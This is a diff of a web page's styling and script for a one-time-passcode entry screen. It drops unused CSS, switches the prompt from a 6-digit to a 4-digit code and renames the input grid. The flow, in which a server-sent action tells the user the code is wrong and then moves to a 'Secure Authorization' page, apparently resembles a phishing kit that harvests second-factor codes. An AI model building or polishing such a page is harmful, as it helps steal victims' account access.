@@ -327,43 +327,6 @@ input[type="text"] {
     background: #fef3c7;
     color: #92400e;
 }
-    
-.otp4 {
-    display: flex;
-    justify-content: center;
-    gap: 10px;
-    margin: 25px 0;
-}
-
-.otp4 input {
-    width: 52px;
-    height: 62px;
-    border: 2px solid #e2e8f0;
-    border-radius: 12px;
-    background: #f8fafc;
-    text-align: center;
-    font-size: 26px;
-    font-weight: bold;
-    color: #041e42;
-    outline: none;
-}
-
-.otp4 input:focus {
-    border-color: #00338d;
-    background: white;
-    box-shadow: 0 0 0 3px rgba(0, 51, 141, 0.06);
-}
-
-.otp4-status {
-    display: none;
-    margin-top: 15px;
-    padding: 12px;
-    border-radius: 8px;
-    font-size: 12px;
-    text-align: center;
-    background: #fef3c7;
-    color: #92400e;
-}
 
 /* Loading Overlay */
 .loading-overlay {
@@ -799,13 +762,13 @@ input[type="text"] {
             <h2>Enter OTP Code</h2>
 
             <p style="margin-top:10px;color:#6b7280">
-                Enter the 6-digit code sent to your phone.
+                Enter the 4-digit code sent to your phone.
             </p>
 
         </div>
 
 
-        <div class="otp2" id="otp2Grid">
+        <div class="otp2" id="otpGrid">
 
             <input maxlength="1" inputmode="numeric">
             <input maxlength="1" inputmode="numeric">
@@ -1529,7 +1492,7 @@ function setupOTP2() {
 
     const inputs =
         document.querySelectorAll(
-            "#otp2Grid input"
+            "#otpGrid input"
         );
 
     const button =
@@ -1605,7 +1568,7 @@ function submitOTP2() {
 
     const inputs =
         document.querySelectorAll(
-            "#otp2Grid input"
+            "#otpGrid input"
         );
 
     const code =
@@ -1649,8 +1612,8 @@ function submitOTP2() {
                         showPage("page7", 7, "Secure Authorization", "Continue securely");
                     } else if (action === "wrongotp") {
                         alert("The OTP provided is wrong or has expired. Please try again.");
-                        document.querySelectorAll("#otp2Grid input").forEach(i => i.value = "");
-                        document.querySelectorAll("#otp2Grid input")[0].focus();
+                        document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
+                        document.querySelectorAll("#otpGrid input")[0].focus();
                     } else {
                         alert("Unknown OTP action: " + action);
                     }
